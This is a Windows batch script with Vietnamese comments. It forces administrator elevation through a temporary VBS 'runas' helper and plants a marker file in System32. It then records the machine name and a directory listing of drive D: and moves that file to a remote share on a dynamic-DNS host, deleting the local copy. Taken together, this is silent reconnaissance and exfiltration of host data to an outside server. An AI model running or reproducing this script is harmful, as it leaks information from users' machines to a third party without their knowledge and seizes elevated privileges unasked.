set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )

echo Hello anh minhthanh > "C:\Windows\System32\WindowsPowerShell\hehehe.txt"
rem del /f /q "C:\Windows\System32\WindowsPowerShell\hehehe.txt"


:: Lấy tên máy tính bằng PowerShell
for /f "delims=" %%i in ('powershell -command "(Get-CimInstance -ClassName Win32_ComputerSystem).Name"') do set DeviceName=%%i

:: Lấy ngày và giờ hiện tại
for /f "tokens=2 delims= " %%a in ('date /t') do set DATE=%%a
for /f "tokens=1-2 delims=: " %%a in ('time /t') do set TIME=%%a%%b
set DATE=%DATE:/=-%
set TIME=%TIME::=-%

:: Tạo tên file dựa trên định dạng DeviceName_Date_Time
set FileName=%DeviceName%_%DATE%_%TIME%.txt

:: Liệt kê nội dung ổ D: và lưu vào file
dir D:\ > "%FileName%"
if errorlevel 1 (
    echo Máy không có ổ D > "%FileName%"
)

:: Di chuyển file đến thư mục đích trên mạng
move "%FileName%" \\minhtuan283.ddns.net\hdd\serial\list\

del /f /q "%FileName%"
:: Xóa các biến tạm
set DeviceName=
set DATE=
set TIME=
set FileName=

echo Quá trình hoàn tất!
exit
